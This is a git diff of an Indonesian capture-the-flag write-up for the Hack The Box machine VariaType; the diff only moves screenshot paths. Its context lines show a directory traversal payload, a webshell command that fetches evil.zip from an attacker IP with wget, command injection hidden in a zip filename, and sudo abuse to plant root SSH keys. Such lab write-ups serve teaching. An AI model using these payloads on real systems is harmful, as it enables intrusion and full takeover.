@@ -45,7 +45,7 @@ Pada tahap akhir, ditemukan aturan `sudo` yang salah konfigurasi yang mengizinka
 
 Secara keseluruhan, mesin ini menyoroti bahaya nyata dari repository yang terbuka, penanganan file yang tidak aman, dan manajemen hak akses yang lemah.
 
-![Tampilan Mesin VariaType di HackTheBox](01-machine-info.png)
+![Tampilan Mesin VariaType di HackTheBox](gambar/01-machine-info.png)
 
 ---
 
@@ -57,12 +57,12 @@ Langkah pertama adalah menghubungkan terminal Kali Linux ke jaringan Hack The Bo
 sudo openvpn ~/Downloads/OpenVPN/variatype.ovpn
 ```
 
-![Koneksi VPN ke Hack The Box berhasil](02-vpn-connect_01.png)
-![Koneksi VPN ke Hack The Box berhasil_02](02-vpn-connect_02.png)
+![Koneksi VPN ke Hack The Box berhasil](gambar/02-vpn-connect_01.png)
+![Koneksi VPN ke Hack The Box berhasil_02](gambar/02-vpn-connect_02.png)
 
 Setelah koneksi VPN aktif, mesin VariaType dinyalakan dan sistem mengalokasikan alamat IP target: **10.129.11.170**.
 
-![Mesin VariaType aktif dengan IP yang ditetapkan](03-machine-started.png)
+![Mesin VariaType aktif dengan IP yang ditetapkan](gambar/03-machine-started.png)
 
 ---
 
@@ -74,7 +74,7 @@ Dengan IP target di tangan, pemindaian Nmap dijalankan untuk mengidentifikasi po
 nmap -sC -sV -A -O -T4 -oN variaType_nmap.txt 10.129.42.177
 ```
 
-![Hasil pemindaian Nmap pada mesin VariaType](04-nmap-scan.png)
+![Hasil pemindaian Nmap pada mesin VariaType](gambar/04-nmap-scan.png)
 
 Hasil pemindaian mengungkap dua port yang aktif:
 
@@ -93,14 +93,14 @@ Karena layanan web melakukan redirect ke domain kustom, entri baru harus ditamba
 echo "10.129.11.170 variatype.htb" | sudo tee -a /etc/hosts
 ```
 
-![Penambahan entri host untuk variatype.htb](05-hosts-config.png)
+![Penambahan entri host untuk variatype.htb](gambar/05-hosts-config.png)
 
 ### Penemuan subdomain `portal` menggunakan ffuf
 ```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -H "Host: FUZZ.variatype.htb" -u http://variatype.htb -mc 200,302,401,403
 ```
-![Penambahan entri host untuk portal.variatype.htb](05-hosts-config_ffuf.png)
+![Penambahan entri host untuk portal.variatype.htb](gambar/05-hosts-config_ffuf.png)
 
 Selain domain utama, subdomain `portal.variatype.htb` juga ditambakan karena terdeteksi saat melakukan pemindaia subdomain menggunaka ffuf. Dengan konfigurasi ini, interaksi dengan aplikasi web dapat berjalan sebagaimana mestinya — bukan sekadar menggunakan alamat IP mentah.
 
@@ -114,7 +114,7 @@ Saat melakukan enumerasi pada subdomain `portal.variatype.htb` menggunakan ferox
 ```bash
 feroxbuster -u http://portal.variatype.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --scan-dir-listings
 ```
-![Direktori .git terbuka secara publik pada portal.variatype.htb_01](git_subdir_found.png)
+![Direktori .git terbuka secara publik pada portal.variatype.htb_01](gambar/git_subdir_found.png)
 
 Direktori `.git` dapat diakses secara publik melalui browser maupun permintaan HTTP biasa:
 
@@ -122,7 +122,7 @@ Direktori `.git` dapat diakses secara publik melalui browser maupun permintaan H
 curl http://portal.variatype.htb/.git/HEAD
 ```
 
-![Direktori .git terbuka secara publik pada portal.variatype.htb](06-git-exposure.png)
+![Direktori .git terbuka secara publik pada portal.variatype.htb](gambar/06-git-exposure.png)
 
 Respons yang dikembalikan adalah:
 
@@ -144,7 +144,7 @@ Setelah memastikan direktori `.git` dapat diakses, sebuah tool digunakan untuk m
 pip install git-dumper
 ```
 
-![Instalasi git-dumper untuk mengekstrak repository yang terbuka](07-git-dumper-install.png)
+![Instalasi git-dumper untuk mengekstrak repository yang terbuka](gambar/07-git-dumper-install.png)
 
 Kemudian repository diambil dari target:
 
@@ -152,7 +152,7 @@ Kemudian repository diambil dari target:
 git-dumper http://portal.variatype.htb/.git ./portal-repo
 ```
 
-![Proses ekstraksi repository Git dari server target](08-git-dump.png)
+![Proses ekstraksi repository Git dari server target](gambar/08-git-dump.png)
 
 Output menampilkan serangkaian respons `200 OK` untuk file-file Git penting seperti `HEAD`, `config`, `index`, dan berbagai object file — membuktikan bahwa repository dapat direkonstruksi secara lokal. Tool secara otomatis menjalankan `git checkout` untuk membangun kembali working tree, memberikan akses penuh ke source code aplikasi.
 
@@ -169,7 +169,7 @@ cd portal-repo
 git log --oneline
 ```
 
-![Daftar commit pada repository yang berhasil diekstrak](09-git-log.png)
+![Daftar commit pada repository yang berhasil diekstrak](gambar/09-git-log.png)
 
 Salah satu commit menyebut nama pengguna **gitbot**, yang langsung menarik perhatian. Untuk menemukan commit yang mungkin sudah dihapus atau tidak lagi terhubung ke branch aktif, digunakan perintah berikut:
 
@@ -177,7 +177,7 @@ Salah satu commit menyebut nama pengguna **gitbot**, yang langsung menarik perha
 git fsck --no-reflog --full --unreachable | grep commit
 ```
 
-![Penemuan unreachable commit melalui git fsck](10-git-fsck.png)
+![Penemuan unreachable commit melalui git fsck](gambar/10-git-fsck.png)
 
 Hasilnya mengungkap adanya **unreachable commit** — sebuah indikasi bahwa konten yang pernah dihapus masih tersimpan dalam objek Git. Commit tersebut kemudian diperiksa secara langsung:
 
@@ -185,7 +185,7 @@ Hasilnya mengungkap adanya **unreachable commit** — sebuah indikasi bahwa kont
 git show 6f021da6be7086f2595befaa025a83d1de99478b
 ```
 
-![Isi unreachable commit yang mengandung kredensial hardcoded](11-git-show.png)
+![Isi unreachable commit yang mengandung kredensial hardcoded](gambar/11-git-show.png)
 
 Pesan commit bertuliskan *"remove hardcoded credentials"*, dan diff-nya memperlihatkan kredensial milik user `gitbot` yang pernah tertanam langsung dalam kode. Meski sudah dihapus dari versi terkini, data tersebut tetap bisa diakses melalui histori Git — memberikan jalur masuk yang valid untuk eksploitasi berikutnya.
 
@@ -195,7 +195,7 @@ Pesan commit bertuliskan *"remove hardcoded credentials"*, dan diff-nya memperli
 
 Memanfaatkan kredensial `gitbot` yang ditemukan dari riwayat Git, proses autentikasi ke portal dilakukan dan session cookie disimpan untuk digunakan pada permintaan selanjutnya:
 
-![Autentikasi berhasil menggunakan kredensial gitbot dari histori Git](12-auth-login.png)
+![Autentikasi berhasil menggunakan kredensial gitbot dari histori Git](gambar/12-auth-login.png)
 
 Setelah mengekstrak `PHPSESSID` dari proses autentikasi sebelumnya, dilakukan percobaan akses ke endpoint unduhan file dengan memanfaatkan parameter yang mencurigakan:
 
@@ -204,7 +204,7 @@ curl -s -i -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" \
     "http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//etc/passwd"
 ```
 
-![Directory traversal berhasil membaca /etc/passwd dari server](13-file-disclosure.png)
+![Directory traversal berhasil membaca /etc/passwd dari server](gambar/13-file-disclosure.png)
 
 Server mengembalikan isi file `/etc/passwd` secara lengkap, mengonfirmasi adanya **kerentanan directory traversal** pada parameter endpoint tersebut. Dari output yang diperoleh, teridentifikasi user bernama `steve` — informasi yang akan berguna pada tahap selanjutnya.
 
@@ -222,7 +222,7 @@ Langkah pertama adalah membuat dua file font minimal yang diperlukan sebagai ref
 python3 generate_fonts.py
 ```
 
-![Pembuatan font source-light.ttf dan source-regular.ttf untuk eksploit](14-font-generation.png)
+![Pembuatan font source-light.ttf dan source-regular.ttf untuk eksploit](gambar/14-font-generation.png)
 
 File `source-light.ttf` dan `source-regular.ttf` berhasil dibuat. Selanjutnya, sebuah file `.designspace` berbahaya dikonstruksi dengan menyematkan PHP webshell di dalam blok CDATA, sekaligus menentukan path output ke lokasi yang dapat diakses melalui web:
 
@@ -274,7 +274,7 @@ curl -X POST "http://variatype.htb/tools/variable-font-generator/process" \
   -F "masters=@source-regular.ttf" -i --follow -s
 ```
 
-![Upload file berbahaya ke endpoint pemrosesan font](15-file-upload.png)
+![Upload file berbahaya ke endpoint pemrosesan font](gambar/15-file-upload.png)
 
 Server merespons dengan pesan **"Processing completed"**, menandakan bahwa payload berhasil diproses. Karena designspace mengarahkan output ke dalam web root, kemungkinan besar file PHP sudah tertulis di sana. Verifikasi dilakukan dengan mengakses shell tersebut:
 
@@ -282,7 +282,7 @@ Server merespons dengan pesan **"Processing completed"**, menandakan bahwa paylo
 curl -i -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" "http://portal.variatype.htb/files/shell.php?cmd=id" --output hasil_rce.txt
 ```
 
-![Pembuatan SSH key pair untuk user steve](17-ssh-keygen.png)
+![Pembuatan SSH key pair untuk user steve](gambar/17-ssh-keygen.png)
 
 ---
 
@@ -292,7 +292,7 @@ ssh-keygen -t ed25519 -f steve_key -N "" -C "steve_variatype"
 
 Proses ini menghasilkan dua file: `steve_key` (private key) dan `steve_key.pub` (public key) tanpa passphrase.
 
-![Pembuatan SSH key steve](pembuatan_ssh_steve.png)
+![Pembuatan SSH key steve](gambar/pembuatan_ssh_steve.png)
 
 Rencana selanjutnya adalah menyuntikkan public key tersebut ke dalam file `~/.ssh/authorized_keys` milik `steve` melalui RCE yang sudah dimiliki, sehingga login SSH tanpa password bisa dilakukan kapan saja.
 
@@ -304,7 +304,7 @@ Untuk mendapatkan akses sebagai `steve`, perlu ada mekanisme yang menyuntikkan p
 python3 make_zip.py
 ```
 
-![Pembuatan evil.zip dengan nama file yang mengandung command injection](18-evil-zip.png)
+![Pembuatan evil.zip dengan nama file yang mengandung command injection](gambar/18-evil-zip.png)
 
 Skrip ini menyematkan public key SSH langsung ke dalam nama file menggunakan command substitution. Saat arsip diproses oleh sistem target, perintah tersebut akan dieksekusi, menciptakan file `authorized_keys` di direktori `.ssh` milik `steve` dan memasukkan public key ke dalamnya. Setelah `evil.zip` siap, langkah selanjutnya adalah mengirimkannya ke target.
 
@@ -318,7 +318,7 @@ Untuk menyerahkan arsip berbahaya ke sistem target, sebuah HTTP server sederhana
 python3 -m http.server 80
 ```
 
-![Python HTTP server aktif untuk melayani evil.zip](19-http-server.png)
+![Python HTTP server aktif untuk melayani evil.zip](gambar/19-http-server.png)
 
 Dari log server, terlihat permintaan `GET /evil.zip` masuk — bukti bahwa target berhasil mengambil file tersebut. Namun untuk memastikan payload benar-benar tersalin ke lokasi yang diproses oleh scheduled task, webshell digunakan untuk secara eksplisit mengunduhnya ke server:
 
@@ -326,7 +326,7 @@ Dari log server, terlihat permintaan `GET /evil.zip` masuk — bukti bahwa targe
 curl "http://portal.variatype.htb/public/files/shell.php?cmd=wget+http://10.10.14.X:8080/evil.zip+-O+/var/www/portal.variatype.htb/uploads/evil.zip"
 ```
 
-![Payload evil.zip berhasil diunduh ke direktori target melalui webshell](20-payload-delivery.png)
+![Payload evil.zip berhasil diunduh ke direktori target melalui webshell](gambar/20-payload-delivery.png)
 
 Dengan payload sudah berada di lokasi yang tepat, tinggal menunggu scheduled job memprosesnya. Begitu itu terjadi, public key akan tersuntikkan ke `authorized_keys` milik `steve`, dan akses SSH pun siap dibuka.
 
@@ -340,7 +340,7 @@ Setelah menunggu beberapa saat agar payload diproses, koneksi SSH dicoba menggun
 ssh -i steve_key steve@10.129.11.170
 ```
 
-![SSH berhasil masuk sebagai user steve](21-ssh-user-access.png)
+![SSH berhasil masuk sebagai user steve](gambar/21-ssh-user-access.png)
 
 Koneksi berhasil terhubung tanpa meminta password — mengonfirmasi bahwa public key sudah tersuntikkan dengan sukses ke `authorized_keys` milik `steve`. Identitas user diverifikasi dengan menjalankan `whoami`, yang mengembalikan output `steve`. User flag kemudian diambil dari direktori home:
 
@@ -360,7 +360,7 @@ Setelah mendapatkan shell SSH sebagai `steve`, enumerasi dimulai untuk mengident
 sudo -l
 ```
 
-![Output sudo -l menampilkan aturan yang bisa dieksploitasi](22-sudo-enum.png)
+![Output sudo -l menampilkan aturan yang bisa dieksploitasi](gambar/22-sudo-enum.png)
 
 Hasil perintah mengungkap bahwa `steve` diizinkan menjalankan skrip Python tertentu sebagai root tanpa memerlukan password:
 
@@ -380,7 +380,7 @@ Setelah mengidentifikasi skrip yang bisa dieksploitasi, sebuah SSH key pair baru
 ssh-keygen -t ed25519 -f root_key -N ""
 ```
 
-![Pembuatan SSH key pair untuk akses root](23-root-keygen.png)
+![Pembuatan SSH key pair untuk akses root](gambar/23-root-keygen.png)
 
 Dua file dihasilkan: `root_key` sebagai private key dan `root_key.pub` sebagai public key. Strategi yang direncanakan adalah memanfaatkan skrip Python yang berjalan dengan hak root untuk menulis isi `root_key.pub` ke dalam file `/root/.ssh/authorized_keys`, sehingga akses SSH langsung sebagai root bisa dilakukan menggunakan private key yang dimiliki.
 
@@ -408,7 +408,7 @@ HTTPServer(("0.0.0.0", 9090), Handler).serve_forever()
 python3 server.py
 ```
 
-![HTTP server berjalan untuk melayani root_key.pub](24-key-hosting.png)
+![HTTP server berjalan untuk melayani root_key.pub](gambar/24-key-hosting.png)
 
 Server ini dikonfigurasi untuk mengembalikan konten `root_key.pub` setiap kali ada permintaan masuk. Dengan server aktif, target siap diperintahkan untuk mengambil file tersebut melalui skrip Python yang dijalankan dengan sudo.
 
@@ -424,7 +424,7 @@ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
   --output /root/.ssh/authorized_keys
 ```
 
-![Eksploitasi sudo berhasil menulis root public key ke authorized_keys](25-privesc-exploit.png)
+![Eksploitasi sudo berhasil menulis root public key ke authorized_keys](gambar/25-privesc-exploit.png)
 
 Output mengonfirmasi bahwa file berhasil diunduh dan dipasang di `/root/.ssh/authorized_keys`. Koneksi SSH sebagai root pun langsung dicoba:
 
@@ -432,7 +432,7 @@ Output mengonfirmasi bahwa file berhasil diunduh dan dipasang di `/root/.ssh/aut
 ssh -i root_key root@10.129.11.170
 ```
 
-![SSH sebagai root berhasil — sistem berhasil dikuasai sepenuhnya](26-root-access.png)
+![SSH sebagai root berhasil — sistem berhasil dikuasai sepenuhnya](gambar/26-root-access.png)
 
 Shell root terbuka. Perintah `whoami` mengembalikan `root`, dan root flag berhasil diambil:
 
